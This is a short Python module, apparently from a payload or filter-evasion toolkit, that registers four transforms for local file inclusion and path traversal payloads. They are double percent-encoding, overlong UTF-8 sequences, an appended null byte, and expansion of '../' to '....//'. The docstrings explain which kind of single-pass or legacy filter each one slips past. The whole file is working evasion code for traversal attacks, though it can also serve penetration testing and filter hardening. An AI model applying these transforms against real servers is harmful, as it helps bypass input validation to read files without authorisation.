"""Local file inclusion / path traversal payload obfuscation."""
from __future__ import annotations

from . import Payload, register


@register(Payload(
    id="lfi_double_encode", category="lfi",
    explain="double-encode ../ and / (%2e%2e%2f)",
    fidelity="differential",
))
def lfi_double_encode(payload: str) -> str:
    """Percent-encode ``../`` and ``/`` so a single-decoding filter misses them."""
    return payload.replace("../", "%2e%2e%2f").replace("/", "%2f")


@register(Payload(
    id="lfi_overlong_utf8", category="lfi",
    explain="overlong-encode / and . (%c0%af / %c0%ae)",
    fidelity="differential",
))
def lfi_overlong_utf8(payload: str) -> str:
    """Rewrite ``/``/``.`` as overlong UTF-8 two-byte sequences."""
    return payload.replace("/", "%c0%af").replace(".", "%c0%ae")


@register(Payload(
    id="lfi_null_byte", category="lfi",
    explain="append %00 terminator",
    fidelity="differential",
))
def lfi_null_byte(payload: str) -> str:
    """Append a NUL so legacy string handling truncates a suffix check."""
    return payload + "%00"


@register(Payload(
    id="lfi_dotdot_variants", category="lfi",
    explain="expand ../ to ....//",
    fidelity="differential",
))
def lfi_dotdot_variants(payload: str) -> str:
    """Expand ``../`` to ``....//`` to survive a single-pass ``../`` stripper."""
    return payload.replace("../", "....//")
